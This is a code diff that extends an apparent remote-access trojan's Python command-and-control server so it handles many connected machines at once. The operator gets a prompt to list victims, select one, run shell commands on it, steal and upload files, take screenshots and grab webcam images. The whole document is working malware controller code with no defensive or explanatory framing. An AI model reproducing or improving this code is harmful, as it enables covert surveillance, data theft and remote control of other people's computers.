@@ -1,5 +1,15 @@
 import socket
-from datetime import date, datetime
+import threading
+from queue import Queue
+
+connections = []
+addresses = []
+names = []
+TASKS = [1,2]
+THREADS = 2
+queue = Queue()
+HOST = ''
+PORT = 1234
 
 def transfer(c):
     destination = input("Enter the destination location: ")
@@ -67,37 +77,129 @@ def webcam(c):
     print("[+] Transfer Complete")
     f.close()
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-port = 1234
-s.bind(('', port))
-s.listen(1)
-c,addr = s.accept()
-shell = c.recv(1024).decode() + ">"
-user = c.recv(1024).decode()
-print("\n[+] Got Connection from ", user, "\n")
-while True:
-    cmd = input(shell)
-    if 'get*' in cmd:
-        transfer(c, cmd)
-        continue
-    elif 'upload*' in cmd:
-        upload(c,cmd)
-        continue
-    elif 'exit' in cmd:
-        c.send(cmd.encode())
-        break
-    elif 'cat*' in cmd:
-        c.send(cmd.encode())
-        cat(c)
-        continue
-    elif cmd == 'ss':
-        c.send(cmd.encode())
-        screenshot(c)
-        continue
-    elif cmd == 'webcam':
-        c.send(cmd.encode())
-        webcam(c)
-        continue
-    c.send(cmd.encode())
-    shell = c.recv(1024).decode()
-    print(c.recv(10240).decode())
+def create_socket_and_bind():
+    global s
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind((HOST, PORT))
+    s.listen(5)
+
+def accept_connection():
+    for conn in connections:
+        conn.close()
+    del connections[:]
+    del addresses[:]
+    del names[:]
+    while True:
+        try:
+            conn, addr = s.accept()
+            #name = conn.recv(1024).deoce()
+            #print(name)
+            conn.setblocking(1)
+            connections.append(conn)
+            addresses.append(addr)
+            #names.append(name)
+            name = conn.recv(1024).decode()
+            names.append(name)
+            print("\n[+] Got connection from ", addr[0],'   ',name,"\n")
+        except:
+            print("Error excepting connections")
+
+def list_all_connections():
+    print("\n----> Connections <----")
+    for i,conn in enumerate(connections):
+        try:
+            conn.send(" ".encode())
+            print(i,'   ', addresses[i][0],'   ', addresses[i][1],'   ',names[i], "\n")
+        except:
+            del connections[i]
+            del addresses[i]
+            del names[i]
+
+def connect(c):
+    c.send('start'.encode())
+    shell = c.recv(1024).decode() + ">"
+    user = c.recv(1024).decode()
+    print("\n[+] Connected to ", user,"\n")
+    while True:
+        try:
+            cmd = input(shell)
+            if 'get*' in cmd:
+                transfer(c, cmd)
+                continue
+            elif 'upload*' in cmd:
+                upload(c,cmd)
+                continue
+            elif 'exit' in cmd:
+                c.send(cmd.encode())
+                break
+            elif 'cat*' in cmd:
+                c.send(cmd.encode())
+                cat(c)
+                continue
+            elif cmd == 'ss':
+                c.send(cmd.encode())
+                screenshot(c)
+                continue
+            elif cmd == 'webcam':
+                c.send(cmd.encode())
+                webcam(c)
+                continue
+            c.send(cmd.encode())
+            shell = c.recv(1024).decode()
+            print(c.recv(10240).decode())
+        except:
+            print("Connection was lost!")
+            break
+
+def start():
+    while True:
+        cmd = input("alpha> ")
+        if cmd == 'list':
+            list_all_connections()
+        elif 'select' in cmd:
+            conn = set_target(cmd)
+            if conn is not None:
+                connect(conn)
+                continue
+        elif 'shutdown' == cmd:
+            print("Shutting down server! ")
+            queue.task_done()
+            queue.task_done()
+            break
+        else:
+            print("Invalid Command!")
+
+def set_target(cmd):
+    try:
+        target = int(cmd.split(" ")[1])
+        return connections[target]
+    except:
+        return None
+
+def create_threads():
+    for _ in range(THREADS):
+        t = threading.Thread(target = tasks)
+        t.daemon = True
+        t.start()
+
+def tasks():
+    while True:
+        x = queue.get()
+        if x == 1:
+            create_socket_and_bind()
+            accept_connection()
+        elif x == 2:
+            start()
+        queue.task_done()
+
+def create_tasks():
+    for x in TASKS:
+        queue.put(x)
+    queue.join()
+    return
+
+def main():
+    create_threads()
+    create_tasks()
+if __name__ == '__main__':
+    main()
